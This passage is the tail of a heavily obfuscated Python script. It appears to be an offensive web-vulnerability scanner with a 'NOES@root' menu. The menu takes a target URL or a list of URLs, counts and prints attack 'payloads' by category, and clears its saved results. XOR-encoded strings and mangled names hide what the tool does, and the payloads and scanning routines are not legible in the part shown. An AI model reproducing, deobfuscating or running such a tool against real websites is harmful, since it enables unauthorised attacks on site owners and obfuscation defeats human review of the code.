    total = 1954647244 ^ 1954647244
    _l0OO01l1I1lI00 = {_0lOOII1IO1OlIllII(b'3~\xbdh\xf2_\xc6\x0f@', b'7\xe4\xbd\x12'): _O01IIlOIlI(b'w\xfa\xfe\x07\xef\xe9?Jn', b'\xe1\xc4z\x87'), _0lOOII1IO1OlIllII(b'}Qm)r\xb1\x14\xc3\xc8A\x92\xfb&F\x1e', b'\x83=.\xaf'): _11OO0OO1llIlI(b'z\xb5\xfb\x96D\xf2\x8d\x14a\xe1\xc4w8\xfc\x1d', b'\x9e\xa8\x98\xec'), _11OO0OO1llIlI(b'E\xbd\xf3\x99&;&@\x1e=X', b'\xbc\x00\x13\x95'): _0011111Il1O1llOllI(b'ToR\xbb\xec\xd9G\xe6\xb0M\x8c', b'\xdeF@\xc5'), _11OO0OO1llIlI(b'\xee\xef\xa5\xcem\x1a\x7f\xd1\xa9\x87', b'\xc6\x92\x92\xed'): _11OO0OO1llIlI(b'j\xf5\xf89R\x02\x8c\xbdD\xb5rw', b'=\xce\xd6^'), _O01IIlOIlI(b's\x1a\xffL\x91\xbf\x15+\xce2\x81\xa8vl\x9e\x97\xf94z', b'\xc5\xf2\xdd\x08'): _O01IIlOIlI(b'\xfd\x1e\xbb\xe3\xed%\xaa\xd3*\xb4"\xb0$t\xe1BP\x90@', b'\xea\x9dk\xc2'), _0011111Il1O1llOllI(b'\xa1\xe8\xcb\x89\xbbe\xe1`\x9bs\x05', b'2\x0f\xa4\x1a'): _O01IIlOIlI(b'+=i]O\xfeY\x8f\x97\xdak', b'\xe2\x97ZL'), _0011111Il1O1llOllI(b'^m\xb9\x9b\x98\x83\xaa\x17>\x94\x83\xea', b'\x13xo\x85'): _0lOOII1IO1OlIllII(b'\xe4\x0b\x89w\x89\x10|^\x93/#J', b'\xdd\xd1\x8c\xd8'), _11OO0OO1llIlI(b'\x81\xaa]\xe2N\x1f")d\xf6\x1c\x18\x8cC', b'X-\x1f\xc6'): _0lOOII1IO1OlIllII(b'\xb9L@\xc3xO\x19\x06!v\x03\xa0\xc4c', b'\xc6\x92!\xa8'), _0lOOII1IO1OlIllII(b'2\x1b\x1a\xf7\xbd\xe4\xb0hd', b'[\xa6\x10\xe4'): _0011111Il1O1llOllI(b'b\xc8\xd9\x85\x8dJ\xed\xcaW', b'/\x8cY\x88'), _11OO0OO1llIlI(b'\xe7m3\x12\xe2<.\x94#\xcb\x93\xb1', b'`\xe08\xa0'): _O01IIlOIlI(b'~\x1a\xab\xe3\xa3\xe0\x145\xb3\xff\xb7\xa9', b'\xf0s\xf5K'), _11OO0OO1llIlI(b'\xef\xb5\x8e\x16\xf7\x0f9V?G3/', b'M\x0e!\x8e'): _O01IIlOIlI(b'\x8e\x0bFU\xc0\xc4\x90\x98F?\xf3f', b'\x80\xb1\x96K'), _11OO0OO1llIlI(b'\xa8\x85K\xc5\xce\xa0\xda\x02s\xae', b'\xb7\xb6\xd6T'): _0lOOII1IO1OlIllII(b'\x045\xc1,\xcb\x81\xa1\xbc\xb1\xea', b'\xa6\xec\xe1?')}
    for _1011I0l10IlI10, _Ill1IOIO0OOIl11lO in _OOlOO01l0O1.items():
        _OII0O1OI0O = _l0OO01l1I1lI00.get(_1011I0l10IlI10, _1011I0l10IlI10.upper())
        print(f'{_Olll0O10Il0O1010I.YELLOW}▶ {_OII0O1OI0O}: {len(_Ill1IOIO0OOIl11lO)}{_Olll0O10Il0O1010I.RESET}')
        for p in _Ill1IOIO0OOIl11lO[:882063883 ^ 882063875]:
            print(f'  {_Olll0O10Il0O1010I.WHITE}• {p}{_Olll0O10Il0O1010I.RESET}')
        if len(_Ill1IOIO0OOIl11lO) > 1950975279 ^ 1950975271:
            print(f'  {_Olll0O10Il0O1010I.MAGENTA}... and {len(_Ill1IOIO0OOIl11lO) - 8} more{_Olll0O10Il0O1010I.RESET}')
        print()
        total += len(_Ill1IOIO0OOIl11lO)
    print(f'{_Olll0O10Il0O1010I.CYAN}Total: {total} payloads{_Olll0O10Il0O1010I.RESET}')
    input(f'\n{_Olll0O10Il0O1010I.CYAN}Press Enter to return...{_Olll0O10Il0O1010I.RESET}')

def _OO1OlIOI10Ol1lI():
    global _lO1lO1111l, _ll1l00O1110, _lI00l1llOO, _IO0lll0OII0O
    try:
        if _IlIIOI11I1.path.exists(_l0l0I0lI1I):
            open(_l0l0I0lI1I, _11OO0OO1llIlI(b't', b'\x05_\xaf\x1f')).close()
        if _IlIIOI11I1.path.exists(_OO0lO0O00lI1OOI1I1):
            _IlIIOI11I1.remove(_OO0lO0O00lI1OOI1I1)
        if _IlIIOI11I1.path.exists(_I00000I0lI1):
            _OlI0Ol000IOlO0Ol.rmtree(_I00000I0lI1)
            _IlIIOI11I1.makedirs(_I00000I0lI1)
    except:
        pass
    _lO1lO1111l = []
    _ll1l00O1110 = []
    _lI00l1llOO = []
    _IO0lll0OII0O = []
    print(f'{_Olll0O10Il0O1010I.GREEN}All cleared!{_Olll0O10Il0O1010I.RESET}')
    input(f'\n{_Olll0O10Il0O1010I.CYAN}Press Enter to return...{_Olll0O10Il0O1010I.RESET}')

def main():
    _101IOI1O0O1I1()
    if not _IlIIOI11I1.path.exists(_l0l0I0lI1I):
        open(_l0l0I0lI1I, _11OO0OO1llIlI(b'\xc0', b'\x9a\xe9gs')).close()
    _00OOOllI1OOIIl0()
    try:
        import requests
        import colorama
    except ImportError:
        print(f'{_Olll0O10Il0O1010I.RED}Run: pip install requests colorama{_Olll0O10Il0O1010I.RESET}')
        _IlO0Il0II1II1.exit(508089597 ^ 508089596)
    while True:
        _OIO00000l1OIIl1()
        choice = input(f'{_Olll0O10Il0O1010I.CYAN}NOES@root:~$ {_Olll0O10Il0O1010I.WHITE}').strip()
        if choice == _0lOOII1IO1OlIllII(b'\xd6', b'\xd8\xcc\x87w'):
            url = input(f'{_Olll0O10Il0O1010I.YELLOW}Target URL: {_Olll0O10Il0O1010I.WHITE}')
            if url:
                _l001llOOllO1l(url)
                input(f'\n{_Olll0O10Il0O1010I.CYAN}Press Enter...{_Olll0O10Il0O1010I.RESET}')
        elif choice == _0lOOII1IO1OlIllII(b'\xe1', b'i\xfc\xf65'):
            if not _IlIIOI11I1.path.exists(_0011111Il1O1llOllI(b'\xfd\x846\xbf\xb2\x86\xcb\xdd', b'\xa8\xa0\x96\xef')):
                print(f'{_Olll0O10Il0O1010I.RED}list.txt not found!{_Olll0O10Il0O1010I.RESET}')
                input(_0lOOII1IO1OlIllII(b'-\xe3\x18\x87\x0f\x9b\x85\x16\x93\xe4[\xe2\xf7\x10', b'\xcd\xda\xa72'))
                continue
            with open(_0lOOII1IO1OlIllII(b'.\r4\x0ff\x81\x98\xd7', b'fz\x9d\x9c'), _11OO0OO1llIlI(b'\xaa', b'_)o/')) as _II11OO0100II1OOOII:
                _0I0lIO10111 = [x.strip() for x in _II11OO0100II1OOOII.readlines() if x.strip()]
            if not _0I0lIO10111:
                print(f'{_Olll0O10Il0O1010I.RED}list.txt is empty!{_Olll0O10Il0O1010I.RESET}')
                input(_0011111Il1O1llOllI(b'/\xec\xc8A\xc1\xbfMA\xda\xfdl3\x18\x9f', b'\x197h\x8a'))
                continue
            for _1lO10l0010I, u in enumerate(_0I0lIO10111, 792610223 ^ 792610222):
                print(f'\n{_Olll0O10Il0O1010I.YELLOW}Scanning {_1lO10l0010I}/{len(_0I0lIO10111)}: {u}{_Olll0O10Il0O1010I.RESET}')
                _l001llOOllO1l(u)
            input(f'\n{_Olll0O10Il0O1010I.CYAN}Press Enter...{_Olll0O10Il0O1010I.RESET}')
        elif choice == _0lOOII1IO1OlIllII(b'/', b'\x83\xf0\x19{'):
            _0IlO010O10I00O1lll()
        elif choice == _0lOOII1IO1OlIllII(b'\xf4', b';\x11\xa5\x03'):
            _1IOI011I01I0I1O()
        elif choice == _0lOOII1IO1OlIllII(b's', b'v\xf9\xd6='):
            _I0OOO0l01l1lOO0OI0()
        elif choice == _11OO0OO1llIlI(b'\xef', b'\xa5\xfcb2'):
            _100I1000I10()
        elif choice == _O01IIlOIlI(b'\x0c', b'HN\xf9\xbf'):
            _lII1O0Ol1OIO0()
        elif choice == _11OO0OO1llIlI(b'z', b'\x8ae/\x18'):
            _0Ol0101OOOOl()
        elif choice == _0lOOII1IO1OlIllII(b'\x7f', b'|\x0cE\x9b'):
            _l0I10101I00()
        elif choice == _0011111Il1O1llOllI(b'\xc2s', b'n2j\r'):
            _1I01Ol1I01IOll()
        elif choice == _0011111Il1O1llOllI(b'\t[', b'\x16\x96,\x95'):
            _OO1OlIOI10Ol1lI()
        elif choice.lower() == _11OO0OO1llIlI(b'\x1b', b'\xa0\xff\xb6\xb9'):
            _IlI0l00O1010Ol0l()
        elif choice == _0lOOII1IO1OlIllII(b'\x17', b'#}!['):
            print(f'\n{_Olll0O10Il0O1010I.RED}╔═══════════════════════════════════════════╗')
            print(f'{_Olll0O10Il0O1010I.RED}║   {_l01Il0Ol1lO10} SHUTDOWN                     ║')
            print(f'{_Olll0O10Il0O1010I.RED}║   Thank you, Master!                    ║')
            print(f'{_Olll0O10Il0O1010I.RED}║   Developer: {_O10I011l0O1I11IIl}                ║')
            print(f'{_Olll0O10Il0O1010I.RED}║   Mode: REAL - All actions logged      ║')
            print(f'{_Olll0O10Il0O1010I.RED}╚═══════════════════════════════════════════╝{_Olll0O10Il0O1010I.RESET}')
            _IlO0Il0II1II1.exit(1142523499 ^ 1142523499)
        else:
            print(f'{_Olll0O10Il0O1010I.RED}Unknown command! Use menu options.{_Olll0O10Il0O1010I.RESET}')
            time.sleep(970311582 ^ 970311583)
if __name__ == _0lOOII1IO1OlIllII(b'0\xba\x1b\xae\xd5\xc3\xb7\xe2', b'u\x16\xa0\r'):
    try:
        main()
    except KeyboardInterrupt:
        print(f'\n\n{_Olll0O10Il0O1010I.RED}Interrupted by user!{_Olll0O10Il0O1010I.RESET}')
        _IlO0Il0II1II1.exit(266233479 ^ 266233479)
    except Exception as e:
        print(f'\n{_Olll0O10Il0O1010I.RED}Fatal Error: {e}{_Olll0O10Il0O1010I.RESET}')
        _IlO0Il0II1II1.exit(335228504 ^ 335228505)
